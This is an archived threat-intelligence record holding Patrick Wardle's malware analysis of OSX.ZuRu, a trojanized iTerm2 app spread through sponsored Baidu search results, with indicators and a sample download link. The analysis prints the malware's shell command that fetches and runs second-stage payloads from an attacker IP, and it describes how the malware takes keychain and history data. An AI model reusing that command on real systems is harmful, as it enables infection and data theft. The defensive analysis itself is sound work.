{
    "id": "9015e467-ddc2-461d-b363-b1e53eed330d",
    "created_at": "2023-01-12T15:05:46.40609Z",
    "updated_at": "2025-03-27T02:16:25.69203Z",
    "deleted_at": null,
    "sha1_hash": "8bf53ef68c50fa9b6dced22280d36b79d7472030",
    "title": "2021-09-14 - OSX.ZuRu- trojanized apps spread malware, via sponsored search results",
    "authors": "",
    "file_creation_date": "2022-05-29T01:24:06Z",
    "file_modification_date": "2022-05-29T01:24:06Z",
    "file_size": 3107649,
    "plain_text": "# Objective-See's Blog\n\n**objective-see.com/blog/blog_0x66.html**\n\nMade in China: OSX.ZuRu\n\ntrojanized apps spread malware, via sponsored search results\n\nby: Patrick Wardle / September 14, 2021\n\nüìù üëæ Want to play along?\n[I‚Äôve uploaded an OSX.ZuRu sample (password: infect3d).](https://objective-see.com/downloads/malware/ZuRu.zip)\n\n...please don‚Äôt infect yourself!\n\n## Background\n\n[Late on September 14th, the noted security researcher Zhi, (@CodeColorist), tweeted about](https://twitter.com/CodeColorist)\nnew attack that was spreading (new?) macOS malware via sponsored search engine results:\n\n[‚Ñπ The posting mentioned in his tweet, zhuanlan.zhihu.com/p/408746101, provides a](https://zhuanlan.zhihu.com/p/408746101)\ndetailed overview of the attack. Moreover, it appears to be the first mention of this attack, and\nas such, should be credited with the discovery of this (widespread?) attack.\n\nHere, we build upon this posting, providing an analysis that focuses on uncovering the\ntechnical details of the attack, such as the specific method of trojanization.\nAs Zhi noted, the malware was hosted on the site `iTerm2.net .`\n\nThis malicious site, appears identical to the legitimate and popular iTerm2 website\n( iTerm2.com ):\n\n\n-----\n\nThe fact the the malicious site, masquerades as the legitimate one is unsurprising as the\nmalware‚Äôs attack vector is based on simple trickery. Specifically, as noted by Zhi and in\n[aforementioned writeup, users who searched for ‚ÄòiTerm2‚Äô on the Chinese search engine](https://zhuanlan.zhihu.com/p/408746101)\nBaidu would have been presented with the sponsored link to the malware:\n\n\n-----\n\n‚Ä¶and following this link, as the malicious site was a clone, perhaps not realize anything was\namiss.\n\n‚Ñπ As of September 15th, the malicious site, iTerm2.net, appears offline.\n\n## Where‚Äôs the Malware?\n\nTo download the malware users would have to click the `Download button, then any of the`\nlinks on the download page. This would download a disk image named `iTerm.dmg from`\n\n```\nhttp://www.kaidingle.com/iTerm/iTerm.dmg\n\n```\n```\n% shasum -a 1 ~/Downloads/iTerm.dmg\na2651c95ed756d07fd204785072c951376010bd8 /Users/patrick/Downloads/iTerm.dmg\n\n```\nCurrently this disk image is not flagged by any of the anti-virus engines on VirusTotal as\nmalicious:\n\nWe can mount the downloaded disk image (to `/Volumes/iTerm ), to examine its contents:`\n\n\n-----\n\nThe main item on the disk image is an application named `iTerm . It appears to mimic again,`\nthe legitimate `iTerm app. Examining the code-signing certificate, we can see that this`\napplication is signed, albeit by a `Jun Bi (AQPZ6F3ASY)`\n\nSigned, by Jun Bi (AQPZ6F3ASY)\nHowever it is not notarized:\n```\n% spctl -a -t exec -vvv /Volumes/iTerm/iTerm.app/\n/Volumes/iTerm/iTerm.app/: rejected\norigin=Apple Distribution: Jun Bi (AQPZ6F3ASY)\n\n```\n\n-----\n\n‚Ñπ The legitimate iTerm2 application is signed by a GEORGE NACHMAN, and is fully\nnotarized.\n\n_Update: As of September 15th, Apple has revoked_ `Jun Bi ‚Äôs code-signing certificate:`\n\nCertificate, now revoked\nThe legitimate and the malicious iTerm2 application bundles contain a massive number of\nfiles, including several Mach-O binaries. Moreover, the malicious version appears largely\nbenign (as is the case with most applications that have been surreptitiously trojanized). As\nsuch, it takes us a minute to uncover the malicious component.\n\nOne of the first actions I take when triaging a new (possibly malicious) binary is dump it‚Äôs\ndependencies. Often you can learn a lot about a binary based on the dynamic libraries it is\nlinked against.\n\nUsing `otool, we view the dependencies of the (suspected to be malicious) iTerm2`\napplication, downloaded from the suspicious `iTerm2.net`\n```\n% otool -L /Volumes/iTerm/iTerm.app/Contents/MacOS/iTerm2\n/usr/lib/libaprutil-1.0.dylib \n/usr/lib/libicucore.A.dylib \n/usr/lib/libc++.1.dylib \n...\n/usr/lib/libz.1.dylib \n@executable_path/../Frameworks/libcrypto.2.dylib\n\n```\n\n-----\n\nThat last library does appear a bit shady (in comparison to the others), simply based on it s\npath, and name. ü§î\n\nAnd if we dump the dependencies of the the legit iTerm2 application, lo and behold, it does\n**not have such a dependency:**\n```\notool -L ~/Downloads/iTerm.app/Contents/MacOS/iTerm2\n/usr/lib/libaprutil-1.0.dylib\n/usr/lib/libicucore.A.dylib \n/usr/lib/libc++.1.dylib\n...\n/usr/lib/libz.1.dylib\n\n```\nSo, have we found the malware? (spoiler: yes).\n\nThe `libcrypto.2.dylib file is 64bit Mach-O dylib, with a SHA1 hash of`\n```\n72ecd873c07b1f96b01bd461d091547f9dbcb2b7\n% file libcrypto.2.dylib\nlibcrypto.2.dylib: Mach-O 64-bit dynamically linked shared library x86_64\n% shasum -a 1 libcrypto.2.dylib \n72ecd873c07b1f96b01bd461d091547f9dbcb2b7 \n/Volumes/iTerm/iTerm.app/Contents/Frameworks/libcrypto.2.dylib\n\n```\nCurrently this dylib is not (also) flagged by any of the anti-virus engines on VirusTotal as\nmalicious:\n\n## Analysis of libcrypto.2.dylib\n\nIf the user runs the trojanized iTerm2 app, nothing appears amiss as a legitimate iTerm shell\nis shown.\n\nQuickly triaging the trojanized iTerm2 application bundle‚Äôs main binary, `iTerm2, appears to`\nbe simply a copy of the legitimate iTerm app. The only modification is the addition of a\n```\nLC_LOAD_DYLIB load command, which adds a dependency to libcrypto.2.dylib\n\n```\n\n-----\n\n```\n% otool l /Volumes/iTerm/iTerm.app/Contents/MacOS/iTerm2\n  Load command 50\n     cmd LC_LOAD_DYLIB\n   cmdsize 80\n     name @executable_path/../Frameworks/libcrypto.2.dylib (offset 24)\n  time stamp 0 Wed Dec 31 14:00:00 1969\n   current version 0.0.0\ncompatibility version 0.0.0\n\n```\nSo how does the `libcrypto.2.dylib get executed when a user launches the trojanized`\niTerm2 application? Excellent question! ‚Ä¶and the answer is, in a very subtle way!\n\nAt load time macOS‚Äôs dynamic loader, `dyld will load any/all dependencies ‚Ä¶including the`\nmalicious `libcrypto.2.dylib . But loading a dylib doesn‚Äôt necessarily execute of its code`\n‚Ä¶unless it explicitly contains a constructor or initialization routine. Which yes,\n```\nlibcrypto.2.dylib does! Specifically, it implements the load method at\n0x0000000000002040\n 1        \n 2+[crypto_2 load]:            \n 30x0000000000002040     push    rbp                    \n 40x0000000000002041     mov    rbp, rsp\n 50x0000000000002044     sub    rsp, 0x10\n 60x0000000000002048     mov    qword [rbp+var_8], rdi\n 70x000000000000204c     mov    qword [rbp+var_10], rsi\n 80x0000000000002050     mov    rax, qword [objc_cls_ref_NSObject]    \n 90x0000000000002057     mov    rsi, qword [0x40530]           \n100x000000000000205e     mov    rdi, rax                 \n110x0000000000002061     call    qword [_objc_msgSend_38140]        \n120x0000000000002067     add    rsp, 0x10\n130x000000000000206b     pop    rbp\n140x000000000000206c     ret\n15            \n\n```\nAccording to Apple‚Äôs [documentation on the](https://developer.apple.com/documentation/objectivec/nsobject/1418815-load?language=objc) `load method, it is automatically invoked when`\nfor example, a dynamic library is loaded.\n\nWe can confirm this in a debugger:\n\n\n-----\n\n```\n% lldb /Volumes/iTerm/iTerm.app/     \n(lldb) target create \"/Volumes/iTerm/iTerm.app/\"\nCurrent executable set to '/Volumes/iTerm/iTerm.app' (x86_64).\n(lldb) process launch --stop-at-entry\n(lldb) b 0x101783040\nBreakpoint 1: where = libcrypto.2.dylib`+[crypto_2 load], address =\n0x0000000101783040\n(lldb) continue\n(lldb) /Volumes/iTerm/iTerm.app/Contents/MacOS/iTerm2\n* thread #1, stop reason = breakpoint 1.1\nlibcrypto.2.dylib`+[crypto_2 load]:\n-> 0x101783040 : pushq %rbp\n  0x101783041 : movq  %rsp, %rbp\n(lldb) bt\n* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1\n * frame #0: 0x0000000101783040 libcrypto.2.dylib`+[crypto_2 load]\n  frame #1: 0x00007fff665cc560 libobjc.A.dylib`load_images + 1529\n  frame #2: 0x00000001011b226c dyld`dyld::notifySingle(...) + 418\n  frame #3: 0x00000001011c5fe9 dyld`ImageLoader::recursiveInitialization(...) + 475\n  frame #4: 0x00000001011c5f66 dyld`ImageLoader::recursiveInitialization(...) + 344\n  frame #5: 0x00000001011c40b4 dyld`ImageLoader::processInitializers(...) + 188\n  frame #6: 0x00000001011c4154 dyld`ImageLoader::runInitializers(....) + 82\n  frame #7: 0x00000001011b26a8 dyld`dyld::initializeMainExecutable() + 199\n  frame #8: 0x00000001011b7bba dyld`dyld::_main(...) + 6667\n  frame #9: 0x00000001011b1227 dyld`dyldbootstrap::start(...) + 453\n  frame #10: 0x00000001011b1025 dyld`_dyld_start + 37\n\n```\nIn the above, note that `libcrypto.2.dylib ‚Äôs` `load method is automatically called as part`\nof `dyld ‚Äôs initialization of the library.`\n\nIf we decompile the `load method, we find it simply calls a method called` `hookCommon .`\nTake a look a this method:\n```\n 1/* @class NSObject */\n 2+(void)hookCommon {\n 3  rax = [NSString stringWithFormat:@\"===========888888888 code:@%@\", @\"1111111\"];\n 4  [self myOCLog:rax];\n 5  \n 6  rax = [self serialNumber];\n 7  rax = [NSString stringWithFormat:@\"===========888888888 identifier:@%@\", rax];\n 8  [self myOCLog:rax];\n 9  \n10  var_70 = dispatch_time(0x0, 0x1bf08eb000);\n11  var_38 = *NSConcreteStackBlock;\n12  dispatch_after(var_70, rax, &var_38);\n13  \n14  return;\n15}\n\n```\n\n-----\n\nThe method first invokes the `myOCLog method (which doesn t actually log anything) with the`\nstring `===========888888888 code:@1111111 and then again with the infected system‚Äôs`\nserial number (obtained via a call to a method aptly named `serialNumber ). Then it`\nexecutes a block of logic via a `dispatch_after ‚Ä¶likely so the` `load method can return`\nright away (as it should, so that other required `dyld can continue).`\n\nThe dispatch callback block simply calls a method named `request (found at`\n```\n0x0000000000003520 ).\n\n```\nAfter decrypting various strings it makes a HTTP GET request via the AFNetworking library\n(that has been statically compiled in) to `https://apps.mzstatics.com/fwjNY/v.php?`\n```\nver=1.3&id=VMI5EOhq8gDz . Note that the value for the id parameter is the infected\n\n```\nsystems serial number.\n\n[If you‚Äôre lucky enough to have LuLu installed it will kindly alert you to this connection attempt:](https://objective-see.com/products/lulu.html)\n\nOnce the server has responded, the malware invokes it‚Äôs\n```\nrunShellWithCommand:completeBlock: method. And what does it attempt to run? The\n\n```\nfollowing (returned from the server?), which included downloading and executing various\n2nd-stage payloads from a server found at `47.75.123.111 :`\n```\ncurl -sfo /tmp/g.py http://47.75.123.111/g.py && chmod 777 /tmp/g.py && python\n/tmp/g.py && curl -sfo /tmp/GoogleUpdate http://47.75.123.111/GoogleUpdate && chmod\n777 /tmp/GoogleUpdate && /tmp/GoogleUpdate\n\n```\nWe can passively observe the execution of these commands via my open-source\n[ProcessMonitor:](https://objective-see.com/products/utilities.html#ProcessMonitor)\n\n\n-----\n\n```\n{\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_EXEC\",\n \"process\" : {\n  \"uid\" : 501,\n  \"arguments\" : [\n   \"/bin/sh\",\n   \"-c\",\n   \"curl -sfo /tmp/g.py http://47.75.123.111/g.py && chmod 777 /tmp/g.py && python\n/tmp/g.py && curl -sfo /tmp/GoogleUpdate http://47.75.123.111/GoogleUpdate && chmod\n777 /tmp/GoogleUpdate && /tmp/GoogleUpdate\"\n  ]\n }\n}\n...\n{\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_EXEC\",\n \"process\" : {\n  \"uid\" : 501,\n  \"arguments\" : [\n   \"python\",\n   \"/tmp/g.py\"\n  ]\n }\n}\n...\n{\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_EXEC\",\n \"process\" : {\n  \"signing info (computed)\" : {\n   \"signatureStatus\" : -67062\n  },\n  \"uid\" : 501,\n  \"arguments\" : [\n   \"/tmp/GoogleUpdate\"\n  ],\n  \"path\" : \"/private/tmp/GoogleUpdate\",\n  \"name\" : \"GoogleUpdate\"\n }\n}\n\n```\nNote that in the ProcessMonitor output, we can see the malware executing the downloaded\npython script, `g.py and another downloaded item,` `GoogleUpdate from a temporary`\ndirectory.\n\n‚Ñπ The libcrypto.2.dylib binary contains embedded (compiler) strings the reveal information\nabout the system it was created on such as: \"/Users/erdou/Desktop/macÊ≥®\nÂÖ•/sendRelease3.1/crypto.2/...\"\nThis provides both a user named (erdou), and a project name (macÊ≥®ÂÖ•). The latter,\npronounced ‚ÄúZh√πr√π‚Äù roughly translates ‚Äúmac injection‚Äù and gives rise to the malware‚Äôs name\n**OSX.ZuRu.**\n\n\n-----\n\n## A Python Script: g.py\n\nThe python script, `g.py (SHA-1:` `20acde856a043194595ed88ef7ae0b79191394f9 )`\nperforms a comprehensive survey of the infected system:\n\n‚Ä¶it then zips this up before exfiltrating it. If we allow the script run, we can then grab and\nextract the zip to see exactly what‚Äôs in the survey:\n\n\n-----\n\nLooks like it includes the infected system‚Äôs keychain, bash history, hosts, and more:\n```\n% cat tmp/tmp.txt \n\n```\nËé∑ÂèñÊìç‰ΩúÁ≥ªÁªüÂêçÁß∞ÂèäÁâàÊú¨Âè∑ : [Darwin-19.6.0-x86_64-i386-64bit]\nËé∑ÂèñÊìç‰ΩúÁ≥ªÁªüÁâàÊú¨Âè∑ : [Darwin Kernel Version 19.6.0: Thu Jun 18 20:49:00 PDT 2020;\n```\nroot:xnu-6153.141.1~1/RELEASE_X86_64]\n\n```\nËé∑ÂèñÊìç‰ΩúÁ≥ªÁªüÁöÑ‰ΩçÊï∞ : [('64bit', '')]\nËÆ°ÁÆóÊú∫Á±ªÂûã : [x86_64]\nËÆ°ÁÆóÊú∫ÁöÑÁΩëÁªúÂêçÁß∞ : [users-mac.lan]\nËÆ°ÁÆóÊú∫Â§ÑÁêÜÂô®‰ø°ÊÅØ : [i386]\nËé∑ÂèñÊìç‰ΩúÁ≥ªÁªüÁ±ªÂûã : [Darwin]\nÊ±áÊÄª‰ø°ÊÅØ : [('Darwin', 'users-mac.lan', '19.6.0', 'Darwin Kernel Version 19.6.0: Thu\n```\nJun 18 20:49:00 PDT 2020; root:xnu-6153.141.1~1/RELEASE_X86_64', 'x86_64', 'i386')]\n\n```\nÁ®ãÂ∫èÂàóË°® : []\n```\nhostsÊñá‰ª∂ : [##\n# Host Database\n#\n# localhost is used to configure the loopback interface\n# when the system is booting. Do not change this entry.\n##\n127.0.0.1  localhost\n255.255.255.255 broadcasthost\n::1       localhost\n]\n\n```\nÂΩìÂâçÁî®Êà∑Âêç : user\n```\ntest : [[u'Desktop', u'Documents', u'Downloads', u'Library', u'Movies', u'Music',\nu'Pictures', u'Public']]\n\n```\n\n-----\n\nOnce the Python script has completed surveying the infected host, it exfiltrates it via `curl`\nto the same IP address ( 47.75.123.111 ). Again, LuLu will alert you, this time about the\nexfiltration attempt:\n\n## A Mach-O Binary: GoogleUpdate\n\nThe second item the trojanized `iTerm application downloads and executes is a Mach-O`\nbinary named `GoogleUpdate (SHA-1:` `25d288d95fe89ac82b17f5ba490df30356ad14b8 ).`\n\nCurrently this binary is not flagged by any of the anti-virus engines on VirusTotal as\nmalicious:\n\nA quick look at it strings reveals its packed by UPX. We can unpack it with a recent version\nof UPX:\n\n\n-----\n\n```\n% upx d /Users/patrick/Downloads/GoogleUpdate \n            Ultimate Packer for eXecutables\n             Copyright (C) 1996 - 2020\nUPX 3.96    Markus Oberhumer, Laszlo Molnar & John Reiser  Jan 23rd 2020\n    File size     Ratio   Format   Name\n  --------------------  ------  -----------  ----------  5961476 \n\n```\nThe unpacked binary has a SHA-1 of `184509b63ac25f3214e1bed52e9c4aa512a0fd9e,`\nand also is not detected as malicious on VirusTotal.\n\nUnfortunately, the binary still packed, or at least obfuscated in some manner üò∞\n\nHowever, if we run it, it attempts to connect to `47.75.96.198 (on port 443). We can`\n[observe this connection via Netiquette:](https://objective-see.com/products/netiquette.html)\n\nAccording to VirusTotal, as of two days ago, this IP address was found to be a Cobalt Strike\nServer:\n\n\n-----\n\n‚Ä¶thus is possible that this binary in merely a Cobalt Strike beacon!\n\n## Conclusions\n\nIn this post, we analyzed a trojanized version of the popular `iTerm application, served up`\nto users via sponsors search engine results on Baidu.\n\nSince then it appears the Baidu has taken action to remove these malicious links, while, as\nnoted Apple has revoked the code signing certificate (ab)used by the malware.\n\nHowever, perhaps the issue was (or still is?) more widespread, as Zhi noted that the scale is\n‚Äúmassive‚Äù and that trojanized apps are in play:\n\n‚Ñπ Other infected disk images include:\n\nSecureCRT.dmg (SHA-1: 6bdcc10c4d6527e57a904c21639807b0f31f7807)\n\nNavicat15_cn.dmg (SHA-1: 99395781fde01321306afeb7d8636af8d4a2631f)\n\ncom.microsoft.rdc.macos (SHA-1: 432d907466f14826157825af235bd0305a05fe41)\n\n\n-----\n\n‚Ä¶so, be careful out there!\n\nüìö The Art of Mac Malware\n\nIf this blog post pique your interest, definitely check out my new book on the topic of Mac\nMalware Analysis:\n\n[\"The Art Of Mac Malware: Analysis\"](https://taomm.org/)\n...it's free online, and new content is regularly added!\n\n## üíï Support Us:\n\n[Love these blog posts? You can support them via my Patreon page!](https://www.patreon.com/bePatron?c=701171)\n\nThis website uses cookies to improve your experience.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-09-14 - OSX.ZuRu- trojanized apps spread malware, via sponsored search results.pdf"
    ],
    "report_names": [
        "2021-09-14 - OSX.ZuRu- trojanized apps spread malware, via sponsored search results.pdf"
    ],
    "threat_actors": [
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535946,
    "ts_updated_at": 1743041785,
    "ts_creation_date": 1653787446,
    "ts_modification_date": 1653787446,
    "files": {
        "pdf": "https://archive.orkl.eu/8bf53ef68c50fa9b6dced22280d36b79d7472030.pdf",
        "text": "https://archive.orkl.eu/8bf53ef68c50fa9b6dced22280d36b79d7472030.txt",
        "img": "https://archive.orkl.eu/8bf53ef68c50fa9b6dced22280d36b79d7472030.jpg"
    }
}